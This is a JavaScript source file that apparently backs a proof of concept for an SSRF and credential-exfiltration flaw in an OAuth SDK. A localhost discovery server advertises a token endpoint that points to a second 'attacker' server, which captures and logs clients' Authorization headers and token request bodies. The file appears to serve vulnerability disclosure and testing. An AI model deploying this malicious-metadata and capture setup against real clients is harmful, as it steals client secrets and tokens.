/**
 * Mock servers for SSRF PoC using REAL SDK.
 *
 * 1) Discovery server (5050): Serves OAuth discovery. Returns token_endpoint
 *    pointing to attacker (5051) — no origin validation in SDK.
 * 2) Attacker server (5051): Logs incoming POST /token (proof of credential exfil).
 *
 */

const http = require('http');

const DISCOVERY_PORT = 5050;
const ATTACKER_PORT = 5051;
const HOST = '127.0.0.1';

const protectedResourceMetadata = {
  resource: `http://${HOST}:${DISCOVERY_PORT}`,
  authorization_servers: [`http://${HOST}:${DISCOVERY_PORT}`],
};

const authorizationServerMetadata = {
  issuer: `http://${HOST}:${DISCOVERY_PORT}`,
  authorization_endpoint: `http://${HOST}:${DISCOVERY_PORT}/authorize`,
  token_endpoint: `http://${HOST}:${ATTACKER_PORT}/token`,
  response_types_supported: ['code'],
  grant_types_supported: ['authorization_code', 'refresh_token'],
  code_challenge_methods_supported: ['S256'],
  token_endpoint_auth_methods_supported: ['client_secret_post', 'client_secret_basic'],
};

const capturedTokenRequests = [];

const discoveryServer = http.createServer((req, res) => {
  const path = req.url?.split('?')[0];
  if (path === '/.well-known/oauth-protected-resource') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(protectedResourceMetadata));
    return;
  }
  if (path === '/.well-known/oauth-authorization-server') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(authorizationServerMetadata));
    return;
  }
  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('not found');
});

const attackerServer = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url?.startsWith('/token')) {
    let body = '';
    req.on('data', (ch) => (body += ch));
    req.on('end', () => {
      capturedTokenRequests.push({ body, headers: req.headers });
      console.log('\n--- Attacker received headers ---');
      console.log('Authorization:', req.headers.authorization);
      console.log('All headers:', req.headers);
      console.log('--- End headers ---\n');
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        access_token: 'stolen',
        token_type: 'Bearer',
        expires_in: 3600,
      }));
    });
    return;
  }
  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('not found');
});

discoveryServer.listen(DISCOVERY_PORT, HOST, () => {
  console.log(`Discovery server http://${HOST}:${DISCOVERY_PORT}`);
});

attackerServer.listen(ATTACKER_PORT, HOST, () => {
  console.log(`Attacker server http://${HOST}:${ATTACKER_PORT}`);
});

module.exports = { capturedTokenRequests, DISCOVERY_PORT, ATTACKER_PORT, HOST };
